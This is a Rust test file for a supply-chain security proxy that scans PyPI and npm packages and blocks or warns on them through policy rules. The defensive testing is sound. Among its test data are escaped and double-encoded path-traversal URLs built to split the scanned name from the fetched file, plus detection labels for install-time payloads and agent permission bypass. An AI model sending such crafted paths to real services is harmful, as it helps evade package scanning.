//! Package installs through the proxy routes: rewriting, blocking, the policy rules,
//! caching, and how downloads fail.

use super::*;

#[tokio::test(flavor = "multi_thread")]
async fn pypi_simple_page_is_rewritten_and_allowed_file_streams() {
    let h = Harness::start(|_| {}).await;
    let page = h.get("/pypi/simple/GoodPkg/").await;
    assert_eq!(page.status(), 200);
    let html = page.text().await.unwrap();
    assert!(
        html.contains(&format!(
            "{}/pypi/files/packages/ab/cd/goodpkg-1.0.0.tar.gz#sha256=00",
            h.base
        )),
        "{html}"
    );
    assert!(!html.contains(&h.mock.base));

    let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "allow");
    assert_eq!(r.bytes().await.unwrap().as_ref(), b"benign archive");

    let ev = h.events().await;
    assert_eq!(ev.len(), 1);
    assert_eq!(ev[0]["kind"], "install");
    assert_eq!(ev[0]["decision"], "allow");
    assert_eq!(ev[0]["name"], "goodpkg");
    assert_eq!(ev[0]["version"], "1.0.0");
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["id"], ev[0]["verdict_id"]);
    assert_eq!(v["artifact"], "goodpkg-1.0.0.tar.gz");
    assert_eq!(v["model_version"], "dev-untrained");
    assert!(v["scores"]["code_gbdt"].as_f64().unwrap() < 0.5);
    assert_eq!(v["thresholds"]["block"], 0.9);
    assert_eq!(v["cached"], false);

    // Second download: served from cache, scan not repeated.
    let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(h.mock.hits("packages/ab/cd/goodpkg-1.0.0.tar.gz"), 1);
    assert_eq!(h.scans.load(Ordering::SeqCst), 1);
    let ev = h.events().await;
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["cached"], true);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn pypi_malicious_file_is_blocked_with_explanation() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("evilpkg", "0.0.1")).await;
    assert_eq!(r.status(), 403);
    let reason = r.status().canonical_reason();
    assert_eq!(reason, Some("Forbidden"));
    assert_eq!(r.headers()["x-customs-decision"], "block");
    let body = r.text().await.unwrap();
    assert!(
        body.starts_with("Customs blocked pypi package evilpkg 0.0.1"),
        "{body}"
    );
    assert!(
        body.contains("Downloads and executes a payload at install time"),
        "{body}"
    );
    assert!(body.contains("/api/verdicts/"), "{body}");

    let ev = h.events().await;
    assert_eq!(ev[0]["decision"], "block");
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["model_decision"], "block");
    assert_eq!(v["reasons"][0]["feature"], "inst_download_exec");
    assert_eq!(v["evidence"][0]["file"], "setup.py");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn code_too_large_to_scan_is_blocked() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("paddedpkg", "1.0.0")).await;
    assert_eq!(r.status(), 403);
    assert_eq!(r.headers()["x-customs-decision"], "block");
    let body = r.text().await.unwrap();
    assert!(body.contains("setup.py could not be read"), "{body}");
    let (_, v) = h.check("pypi", "paddedpkg", None).await;
    assert_eq!(v["decision"], "block");
    assert_eq!(v["model_decision"], "allow");
    assert_eq!(v["policy_hits"][0]["rule"], "unread_code");
    h.stop().await;

    let h = Harness::start(|p| p.unread_code = RuleSeverity::Off).await;
    let r = h.get(&pypi_file_path("paddedpkg", "1.0.0")).await;
    assert_eq!(r.status(), 200);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn install_time_agent_with_checks_off_is_blocked() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("agentic", "1.0.0")).await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(
        body.contains("runs an AI coding agent with its permission checks off"),
        "{body}"
    );
    let (_, v) = h.check("pypi", "agentic", None).await;
    assert_eq!(v["decision"], "block");
    assert_eq!(v["model_decision"], "allow");
    assert_eq!(v["policy_hits"][0]["rule"], "agent_bypass");
    h.stop().await;

    let h = Harness::start(|p| p.agent_bypass = RuleSeverity::Warn).await;
    let r = h.get(&pypi_file_path("agentic", "1.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "warn");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn raw_reason_phrase_names_the_rule() {
    let h = Harness::start(|p| p.deny = vec!["pypi:goodpkg".into()]).await;
    let path = pypi_file_path("goodpkg", "1.0.0");
    let mut s = tokio::net::TcpStream::connect(h.base.trim_start_matches("http://"))
        .await
        .unwrap();
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    s.write_all(
        format!("GET {path} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n").as_bytes(),
    )
    .await
    .unwrap();
    let mut buf = Vec::new();
    s.read_to_end(&mut buf).await.unwrap();
    let text = String::from_utf8_lossy(&buf);
    let status_line = text.lines().next().unwrap();
    assert_eq!(
        status_line,
        "HTTP/1.1 403 Blocked by Customs: deny: pypi:goodpkg is on the deny list"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn typosquat_name_is_warned_but_served() {
    // The warn comes from the dev models' name weight (1.0). The shipped ensemble gives the
    // name model about no weight, so with it the name alone does not warn.
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("reqeusts", "2.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "warn");
    let (status, v) = h.check("pypi", "reqeusts", None).await;
    assert_eq!(status, 200);
    assert_eq!(v["decision"], "warn");
    let labels: Vec<&str> = v["reasons"]
        .as_array()
        .unwrap()
        .iter()
        .map(|r| r["label"].as_str().unwrap())
        .collect();
    assert!(
        labels.contains(&"1 edit from popular package 'requests'"),
        "{labels:?}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn new_versions_hit_min_age() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("newpkg", "1.0.0")).await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(
        body.contains("min_age_days: published 2 hours ago (policy: 3 days)"),
        "{body}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn established_releases_of_popular_packages_skip_the_model() {
    let h = Harness::start(|_| {}).await;
    // Through the proxy: the model blocks, the established-package prior serves it.
    let r = h.get(&pypi_file_path("six", "1.16.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "allow");
    let (status, v) = h.check("pypi", "six", Some("1.16.0")).await;
    assert_eq!(status, 200);
    assert_eq!(v["decision"], "allow");
    // The dev model warns on the archive (its name model lowers the risk of a popular
    // name); the trained one blocks requests 2.32.3. Either is set aside.
    let model = v["model_decision"].clone();
    assert_ne!(model, "allow", "{v}");
    assert!(v["risk"].as_f64().unwrap() >= v["thresholds"]["warn"].as_f64().unwrap());
    let hit = v["policy_hits"]
        .as_array()
        .unwrap()
        .iter()
        .find(|h| h["rule"] == "established")
        .unwrap_or_else(|| panic!("{v}"));
    assert_eq!(hit["severity"], "allow");
    let detail = hit["detail"].as_str().unwrap();
    assert!(
        detail.starts_with("top-5000 PyPI package (#")
            && detail.ends_with("(200 days ago; policy: 30 days)"),
        "{detail}"
    );
    // A popular name with a release younger than 30 days gets the model's verdict.
    let r = h.get(&pypi_file_path("six", "1.17.0")).await;
    assert_ne!(r.headers()["x-customs-decision"], "allow");
    let (_, v) = h.check("pypi", "six", Some("1.17.0")).await;
    assert_ne!(v["decision"], "allow", "{v}");
    assert_eq!(v["decision"], v["model_decision"]);
    assert!(rules_of(&v).iter().all(|r| r != "established"), "{v}");
    // An unpopular name at any age gets the model's verdict.
    let (_, v) = h.check("pypi", "evilpkg", None).await;
    assert_eq!(v["decision"], "block");
    assert!(rules_of(&v).iter().all(|r| r != "established"), "{v}");
    h.stop().await;

    // The deny list still wins.
    let h = Harness::start(|p| p.deny = vec!["pypi:six".into()]).await;
    let r = h.get(&pypi_file_path("six", "1.16.0")).await;
    assert_eq!(r.status(), 403);
    let (_, v) = h.check("pypi", "six", Some("1.16.0")).await;
    assert_eq!(v["decision"], "block");
    assert_eq!(rules_of(&v), vec!["deny"]);
    h.stop().await;

    // Switched off, the model decides.
    let h = Harness::start(|p| p.established.enabled = false).await;
    let r = h.get(&pypi_file_path("six", "1.16.0")).await;
    assert_eq!(r.headers()["x-customs-decision"], model.as_str().unwrap());
    let (_, v) = h.check("pypi", "six", Some("1.16.0")).await;
    assert_eq!(v["decision"], model);
    assert!(rules_of(&v).is_empty(), "{v}");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn archives_over_the_scan_limit_with_install_code_are_blocked() {
    let limits = Limits {
        max_scan_bytes: 4,
        ..Limits::default()
    };
    let h = Harness::start_full(|_| {}, None, limits).await;
    // An sdist runs its build at install; the mock's bytes are not even an archive.
    let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(body.contains("unread_code"), "{body}");
    assert!(body.contains("above the 0 MB scan limit"), "{body}");
    // A tarball whose layout cannot be read fails closed the same way.
    let r = h.get("/npm/plainlib/-/plainlib-0.1.0.tgz").await;
    assert_eq!(r.status(), 403);
    // The scanner never ran on either.
    assert_eq!(h.scans.load(Ordering::SeqCst), 0);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn upstream_urls_cannot_be_redirected_by_escaped_paths() {
    let h = Harness::start(|_| {}).await;
    // The name Customs would scan and the URL it would fetch must agree: a fragment,
    // query, backslash or leftover escape could make them differ.
    for path in [
        "/pypi/files/packages/ab/cd/evil-1.0.tar.gz%23/goodpkg-1.0.0.tar.gz",
        "/pypi/files/packages/ab/cd/evil-1.0-py3-none-any.whl%23.metadata",
        "/pypi/files/packages/ab/cd/evil-1.0.tar.gz%3F/goodpkg-1.0.0.tar.gz",
        "/pypi/files/packages/%252e%252e/cd/goodpkg-1.0.0.tar.gz",
        "/pypi/files/packages/ab%5C..%5Ccd/goodpkg-1.0.0.tar.gz",
        "/pypi/simple/good%23pkg/",
    ] {
        assert_eq!(h.get(path).await.status(), 400, "{path}");
    }
    for path in [
        "/npm/-/%252e%252e/evil",
        "/npm/evil/-/evil-1.0.0.tgz%23/plainlib-0.1.0.tgz",
        "/npm/plainlib/-/..%5Cplainlib-0.1.0.tgz",
    ] {
        assert_eq!(h.get(path).await.status(), 404, "{path}");
    }
    assert_eq!(h.mock.hits("packages/ab/cd/goodpkg-1.0.0.tar.gz"), 0);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn npm_packument_rewrite_and_tarballs() {
    let h = Harness::start(|_| {}).await;
    // Registry service endpoints pass through with their query (`npm search`).
    let r: Value = h
        .get("/npm/-/v1/search?text=left-pad&size=20")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(r["query"], "text=left-pad&size=20");
    for path in ["/npm/@scope%2flib", "/npm/@scope/lib", "/npm/@scope%2Flib"] {
        let r = h.get(path).await;
        assert_eq!(r.status(), 200, "{path}");
        let v: Value = r.json().await.unwrap();
        assert_eq!(
            v["versions"]["1.2.3"]["dist"]["tarball"],
            format!("{}/npm/@scope/lib/-/lib-1.2.3.tgz", h.base),
            "{path}"
        );
    }
    let r = h.get("/npm/@scope/lib/-/lib-1.2.3.tgz").await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.bytes().await.unwrap().as_ref(), b"benign scoped");
    let r = h.get("/npm/plainlib/-/plainlib-0.1.0.tgz").await;
    assert_eq!(r.status(), 200);

    let r = h.get("/npm/evil-js/-/evil-js-6.6.6.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    assert!(err["error"]
        .as_str()
        .unwrap()
        .contains("Customs blocked npm package evil-js 6.6.6"));

    // Young package with a postinstall script: blocked by both age rules.
    let r = h.get("/npm/freshpkg/-/freshpkg-1.0.0.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    let msg = err["error"].as_str().unwrap();
    assert!(msg.contains("min_age_days"), "{msg}");
    assert!(
        msg.contains("block_install_scripts_from_new: runs install scripts (postinstall)"),
        "{msg}"
    );

    let r = h.get("/npm/does-not-exist").await;
    assert_eq!(r.status(), 404);
    let ev = h.events().await;
    assert_eq!(ev[0]["kind"], "nonexistent_package");
    assert_eq!(ev[0]["name"], "does-not-exist");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn warn_only_age_rule_with_install_scripts() {
    let h = Harness::start(|p| p.min_age_severity = customs::config::AgeSeverity::Warn).await;
    let (_, v) = h.check("npm", "freshpkg", None).await;
    assert_eq!(v["decision"], "block");
    let rules: Vec<&str> = v["policy_hits"]
        .as_array()
        .unwrap()
        .iter()
        .map(|h| h.as_str_rule())
        .collect();
    assert_eq!(
        rules,
        vec!["min_age_days", "block_install_scripts_from_new"]
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn dependency_rules() {
    let h = Harness::start(|_| {}).await;
    let (s, v) = h.check("npm", "depjack", None).await;
    assert_eq!(s, 200);
    assert_eq!(v["decision"], "block");
    let r = rules_of(&v);
    assert!(
        r.contains(&"nonregistry_dependency_added".to_string()),
        "{v}"
    );
    assert!(r.contains(&"young_dependency_added".to_string()), "{v}");
    let detail = v["policy_hits"]
        .as_array()
        .unwrap()
        .iter()
        .find(|x| x["rule"] == "young_dependency_added")
        .unwrap()["detail"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(
        detail.contains("lure-dep was first published 24 hours before"),
        "{detail}"
    );
    // The proxy applies the same rules to the tarball.
    let r = h.get("/npm/depjack/-/depjack-2.0.1.tgz").await;
    assert_eq!(r.status(), 403);
    h.stop().await;

    // Both rules can be turned off; the earlier release never triggers them.
    let h = Harness::start(|p| {
        p.nonregistry_dependency_added = RuleSeverity::Off;
        p.young_dependency_added = RuleSeverity::Off;
    })
    .await;
    let (_, v) = h.check("npm", "depjack", None).await;
    let r = rules_of(&v);
    assert!(!r.iter().any(|x| x.contains("dependency")), "{v}");
    let (_, v) = h.check("npm", "depjack", Some("2.0.0")).await;
    assert!(rules_of(&v).is_empty(), "{v}");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn release_history_rules() {
    // The default policy blocks a release that adds an install script.
    let h = Harness::start(|_| {}).await;
    let (_, v) = h.check("npm", "hijacked", None).await;
    assert_eq!(v["decision"], "block");
    let r = h.get("/npm/hijacked/-/hijacked-1.1.1.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    assert!(err["error"]
        .as_str()
        .unwrap()
        .contains("install_script_added"));
    h.stop().await;

    let h = Harness::start(|p| p.install_script_added = RuleSeverity::Warn).await;
    // `check` and the proxy both compare the release with the ones before it.
    let (s, v) = h.check("npm", "hijacked", None).await;
    assert_eq!(s, 200);
    assert_eq!(v["version"], "1.1.1");
    assert_eq!(
        rules_of(&v),
        vec![
            "provenance_dropped",
            "install_script_added",
            "dormant_revival",
            "publisher_changed"
        ]
    );
    assert_eq!(v["decision"], "warn");
    assert!(v["policy_hits"][1]["detail"]
        .as_str()
        .unwrap()
        .contains("postinstall added since 1.1.0: node bundle.js"));

    // Warnings: the proxy serves the tarball and records the same hits.
    let r = h.get("/npm/hijacked/-/hijacked-1.1.1.tgz").await;
    assert_eq!(r.status(), 200);
    let ev = h.events().await;
    assert_eq!(ev[0]["kind"], "install");
    let id = ev[0]["verdict_id"].as_i64().unwrap();
    let verdict: Value = h
        .get(&format!("/api/verdicts/{id}"))
        .await
        .json()
        .await
        .unwrap();
    assert!(rules_of(&verdict).contains(&"publisher_changed".to_string()));
    let (_, v) = h.check("npm", "hijacked", Some("1.1.0")).await;
    assert!(rules_of(&v).is_empty(), "{v}");

    // PyPI through the proxy: the project document provides the history.
    let r = h.get(&pypi_file_path("revived", "1.1.0")).await;
    assert_eq!(r.status(), 200);
    let id = h.events().await[0]["verdict_id"].as_i64().unwrap();
    let verdict: Value = h
        .get(&format!("/api/verdicts/{id}"))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(rules_of(&verdict), vec!["dormant_revival"]);
    // PyPI provenance comes from the JSON simple index.
    let (_, v) = h.check("pypi", "unsigned", None).await;
    assert_eq!(v["version"], "1.1.0");
    assert_eq!(rules_of(&v), vec!["provenance_dropped"]);
    assert!(v["policy_hits"][0]["detail"]
        .as_str()
        .unwrap()
        .contains("previous release 1.0.0 had one"));
    let (_, v) = h.check("pypi", "unsigned", Some("1.0.0")).await;
    assert!(rules_of(&v).is_empty(), "{v}");
    h.stop().await;

    // Severities are configurable, and `off` keeps a rule quiet.
    let h = Harness::start(|p| {
        p.install_script_added = RuleSeverity::Warn;
        p.provenance_dropped = RuleSeverity::Block;
        p.publisher_changed = RuleSeverity::Off;
        p.dormant_revival = RuleSeverity::Off;
    })
    .await;
    let r = h.get("/npm/hijacked/-/hijacked-1.1.1.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    assert!(err["error"]
        .as_str()
        .unwrap()
        .contains("provenance_dropped"));
    let (_, v) = h.check("npm", "hijacked", None).await;
    assert_eq!(
        rules_of(&v),
        vec!["provenance_dropped", "install_script_added"]
    );
    let r = h.get(&pypi_file_path("revived", "1.1.0")).await;
    assert_eq!(r.status(), 200);
    let id = h.events().await[0]["verdict_id"].as_i64().unwrap();
    let verdict: Value = h
        .get(&format!("/api/verdicts/{id}"))
        .await
        .json()
        .await
        .unwrap();
    assert!(rules_of(&verdict).is_empty(), "{verdict}");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn nonexistent_packages() {
    let h = Harness::start(|_| {}).await;
    let r = h.get("/pypi/simple/nope-not-here/").await;
    assert_eq!(r.status(), 404);
    let ev = h.events().await;
    assert_eq!(ev[0]["kind"], "nonexistent_package");
    assert_eq!(ev[0]["decision"], "block");

    // The check ran and decided, so it answers 200 with the verdict like any other check;
    // the block_nonexistent hit says why.
    let (status, body) = h.check("pypi", "nope-not-here", None).await;
    assert_eq!(status, 200);
    assert_eq!(body["decision"], "block");
    assert!(body["id"].is_i64());
    let hits = body["policy_hits"].as_array().unwrap();
    let hit = hits
        .iter()
        .find(|h| h["rule"] == "block_nonexistent")
        .unwrap();
    assert!(hit["detail"]
        .as_str()
        .unwrap()
        .contains("does not exist on PyPI"));
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn concurrent_requests_scan_once() {
    let h = Harness::start(|_| {}).await;
    // Hold the one upstream download until all eight requests have joined it.
    let gate = hold_downloads(&h);
    let path = pypi_file_path("slowpkg", "1.0.0");
    let mut tasks = Vec::new();
    for _ in 0..8 {
        let (http, url) = (h.http.clone(), format!("{}{path}", h.base));
        tasks.push(tokio::spawn(async move {
            let r = http.get(url).send().await.unwrap();
            let id = r.headers()["x-customs-verdict"]
                .to_str()
                .unwrap()
                .to_string();
            (r.status().as_u16(), id, r.bytes().await.unwrap())
        }));
    }
    wait_for_metric(&h, "customs_singleflight_joins_total 7").await;
    gate.add_permits(1);
    let mut ids = Vec::new();
    for t in tasks {
        let (status, id, body) = t.await.unwrap();
        assert_eq!(status, 200);
        assert_eq!(body.as_ref(), b"benign slow");
        ids.push(id);
    }
    assert_eq!(h.mock.hits("packages/ab/cd/slowpkg-1.0.0.tar.gz"), 1);
    assert_eq!(h.scans.load(Ordering::SeqCst), 1);
    assert!(ids.windows(2).all(|w| w[0] == w[1]), "{ids:?}");
    let metrics = h.get("/metrics").await.text().await.unwrap();
    assert!(
        metrics.contains("customs_singleflight_joins_total 7"),
        "{metrics}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn monitor_mode_serves_blocked_artifacts() {
    let h = Harness::start(|p| p.mode = Mode::Monitor).await;
    let r = h.get(&pypi_file_path("evilpkg", "0.0.1")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "block");
    assert_eq!(r.bytes().await.unwrap().as_ref(), b"EVIL archive");
    let ev = h.events().await;
    assert_eq!(ev[0]["decision"], "block");
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["mode"], "monitor");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn young_releases_are_held_back_so_unpinned_installs_resolve_older() {
    let h = Harness::start(|_| {}).await;
    // PyPI HTML and JSON simple pages mark the release from an hour ago yanked, which
    // resolvers skip unless it is pinned with `==`.
    let r = h.get("/pypi/simple/rolling/").await;
    assert_eq!(r.headers()["x-customs-hidden-versions"], "1");
    let html = r.text().await.unwrap();
    let link = |v: &str| {
        let f = file_name("rolling", v);
        html.lines()
            .find(|l| l.contains(&format!(">{f}<")))
            .unwrap_or_else(|| panic!("{f} missing: {html}"))
            .to_string()
    };
    assert!(!link("1.0.0").contains("data-yanked"), "{html}");
    assert!(
        link("1.1.0").contains("data-yanked=\"Customs: published less than 3 days ago"),
        "{html}"
    );
    let r = h
        .http
        .get(format!("{}/pypi/simple/rolling/", h.base))
        .header("accept", "application/vnd.pypi.simple.v1+json")
        .send()
        .await
        .unwrap();
    let doc: Value = r.json().await.unwrap();
    let files: Vec<(&str, bool)> = doc["files"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| {
            let yanked = f.get("yanked").is_some_and(|y| y.is_string());
            (f["filename"].as_str().unwrap(), yanked)
        })
        .collect();
    let (old, young) = (file_name("rolling", "1.0.0"), file_name("rolling", "1.1.0"));
    assert_eq!(files, vec![(old.as_str(), false), (young.as_str(), true)]);
    // A pin on the young release is still refused, with the rule's reason.
    let r = h.get(&pypi_file_path("rolling", "1.1.0")).await;
    assert_eq!(r.status(), 403);
    // Checks resolve unpinned specs the way the proxy serves them.
    let (_, v) = h.check("pypi", "rolling", None).await;
    assert_eq!(v["version"], "1.0.0");
    assert_eq!(v["decision"], "allow");
    let (_, v) = h.check("pypi", "rolling", Some(">=1.0")).await;
    assert_eq!(v["version"], "1.0.0");
    let (_, v) = h.check("pypi", "rolling", Some("==1.1.0")).await;
    assert_eq!(v["version"], "1.1.0");
    assert_eq!(v["decision"], "block");
    assert_eq!(
        h.check("pypi", "rolling", None).await.1["policy_hits"][0]["rule"],
        "min_age_resolution"
    );
    // A client whose installer skips the proxy sees every version, and so must the check.
    let r = h
        .http
        .post(format!("{}/api/check", h.base))
        .json(&json!({"ecosystem": "pypi", "name": "rolling", "resolve": "upstream"}))
        .send()
        .await
        .unwrap();
    let v: Value = r.json().await.unwrap();
    assert_eq!(v["version"], "1.1.0");
    assert_eq!(v["decision"], "block");

    // npm: the version is gone and `latest` moves back.
    let r = h.get("/npm/rolling-js").await;
    assert_eq!(r.headers()["x-customs-hidden-versions"], "1");
    let doc: Value = r.json().await.unwrap();
    assert_eq!(doc["dist-tags"]["latest"], "1.0.0");
    assert!(doc["versions"].get("1.1.0").is_none());
    assert!(doc["versions"].get("1.0.0").is_some());
    let (_, v) = h.check("npm", "rolling-js", Some("^1.0.0")).await;
    assert_eq!(v["version"], "1.0.0");
    // A package with no older release keeps it, so the block names the rule.
    let doc: Value = h.get("/npm/freshpkg").await.json().await.unwrap();
    assert!(doc["versions"].get("1.0.0").is_some());
    h.stop().await;

    // Monitor mode serves everything and so hides nothing.
    let h = Harness::start(|p| p.mode = customs::config::Mode::Monitor).await;
    let doc: Value = h.get("/npm/rolling-js").await.json().await.unwrap();
    assert_eq!(doc["dist-tags"]["latest"], "1.1.0");
    h.stop().await;
    let h = Harness::start(|p| p.hide_young_versions = false).await;
    let html = h.get("/pypi/simple/rolling/").await.text().await.unwrap();
    assert!(
        html.contains(&file_name("rolling", "1.1.0")) && !html.contains("data-yanked"),
        "{html}"
    );
    h.stop().await;
}

fn sha256_hex(b: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    hex::encode(Sha256::digest(b))
}

#[tokio::test(flavor = "multi_thread")]
async fn scan_cache_ignores_summaries_from_an_older_scanner() {
    let h = Harness::start(|_| {}).await;
    // What a build from before the `agent_bypass` rule cached for this archive: keyed by
    // the model version alone, and without the field.
    let old = json!({
        "risk": 0.01, "scores": {}, "reasons": [], "evidence": [], "install_surface": [],
        "scan_errors": [], "install_scripts": [], "scanned_ms": 1, "scanned": true,
    });
    let key = customs::store::ScanKey {
        ecosystem: Ecosystem::Pypi,
        name: "agentic".into(),
        version: Some("1.0.0".into()),
        sha256: sha256_hex(b"benign but agentic"),
        model_version: "dev-untrained".into(),
    };
    h.engine
        .store
        .scan_cache_put(&key, &old.to_string())
        .unwrap();
    let (_, v) = h.check("pypi", "agentic", Some("1.0.0")).await;
    assert_eq!(v["cached"], false, "{v}");
    assert!(rules_of(&v).contains(&"agent_bypass".to_string()), "{v}");
    assert_eq!(h.scans.load(Ordering::SeqCst), 1);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_release_published_while_metadata_is_cached_is_still_young() {
    let h = Harness::start(|_| {}).await;
    // The proxy's tarball path: the packument is cached, then a release with an install
    // script appears.
    assert_eq!(h.get("/npm/plainlib").await.status(), 200);
    let mut f = ExtraFile::new(
        "plainlib",
        "0.2.0",
        "plainlib-0.2.0.tgz",
        b"benign plain 0.2.0",
        now_rfc3339(),
    );
    f.doc = json!({"scripts": {"postinstall": "node x.js"}});
    h.mock.extra_npm.lock().unwrap().push(f);
    let r = h.get("/npm/plainlib/-/plainlib-0.2.0.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    let msg = err["error"].as_str().unwrap();
    assert!(msg.contains("min_age_days: published"), "{msg}");
    assert!(msg.contains("block_install_scripts_from_new"), "{msg}");

    // The packument the proxy serves leaves the new release out.
    assert_eq!(h.get("/npm/@scope/lib").await.status(), 200);
    h.mock.extra_npm.lock().unwrap().push(ExtraFile::new(
        "@scope/lib",
        "1.3.0",
        "lib-1.3.0.tgz",
        b"benign scoped 1.3.0",
        now_rfc3339(),
    ));
    let r = h.get("/npm/@scope/lib").await;
    assert_eq!(
        r.headers()
            .get("x-customs-hidden-versions")
            .map(|v| v.to_str().unwrap()),
        Some("1")
    );
    let doc: Value = r.json().await.unwrap();
    assert!(doc["versions"].get("1.3.0").is_none(), "{doc}");
    assert_eq!(doc["dist-tags"]["latest"], "1.2.3");

    // A check pinned to the new release finds it instead of failing to resolve.
    let (s, _) = h.check("npm", "lure-dep", None).await;
    assert_eq!(s, 200);
    h.mock.extra_npm.lock().unwrap().push(ExtraFile::new(
        "lure-dep",
        "0.0.2",
        "lure-dep-0.0.2.tgz",
        b"benign lure 0.0.2",
        now_rfc3339(),
    ));
    let (s, v) = h.check("npm", "lure-dep", Some("0.0.2")).await;
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["version"], "0.0.2");
    assert!(rules_of(&v).contains(&"min_age_days".to_string()), "{v}");

    // PyPI: the simple page marks a release the cached project document lacks.
    let html = h.get("/pypi/simple/goodpkg/").await.text().await.unwrap();
    assert!(!html.contains("data-yanked"), "{html}");
    h.mock.extra_pypi.lock().unwrap().push(ExtraFile::new(
        "goodpkg",
        "1.2.0",
        "goodpkg-1.2.0.tar.gz",
        b"benign archive v1.2",
        now_rfc3339(),
    ));
    let html = h.get("/pypi/simple/goodpkg/").await.text().await.unwrap();
    let line = html
        .lines()
        .find(|l| l.contains(">goodpkg-1.2.0.tar.gz<"))
        .unwrap_or_else(|| panic!("{html}"));
    assert!(line.contains("data-yanked"), "{html}");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_file_added_to_an_old_release_is_not_established() {
    let h = Harness::start(|_| {}).await;
    // six 1.16.0 is an established release; its project document is now cached.
    let r = h.get(&pypi_file_path("six", "1.16.0")).await;
    assert_eq!(r.headers()["x-customs-decision"], "allow");
    // A wheel uploaded to that release today is as new as its upload.
    h.mock.extra_pypi.lock().unwrap().push(ExtraFile::new(
        "six",
        "1.16.0",
        "six-1.16.0-py3-none-any.whl",
        b"EVIL wheel uploaded today",
        now_rfc3339(),
    ));
    let r = h
        .get("/pypi/files/packages/ab/cd/six-1.16.0-py3-none-any.whl")
        .await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(body.contains("min_age_days: published"), "{body}");
    assert!(!body.contains("established"), "{body}");
    // A file the registry does not list at all has no known age.
    let mut f = ExtraFile::new(
        "six",
        "1.16.0",
        "six-1.16.0-py2-none-any.whl",
        b"benign unlisted",
        now_rfc3339(),
    );
    f.listed = false;
    h.mock.extra_pypi.lock().unwrap().push(f);
    let r = h
        .get("/pypi/files/packages/ab/cd/six-1.16.0-py2-none-any.whl")
        .await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(body.contains("publish time unknown"), "{body}");
    // An npm tarball named for another package is not a version of this one.
    let mut f = ExtraFile::new(
        "plainlib",
        "0.1.0",
        "evil-0.1.0.tgz",
        b"benign evil",
        now_rfc3339(),
    );
    f.listed = false;
    h.mock.extra_npm.lock().unwrap().push(f);
    let r = h.get("/npm/plainlib/-/evil-0.1.0.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    assert!(
        err["error"]
            .as_str()
            .unwrap()
            .contains("publish time unknown"),
        "{err}"
    );
    h.stop().await;
}

/// An upstream that answers every request with `head` (status line and headers), then
/// `body` (one byte per `gap` when set), then closes the connection.
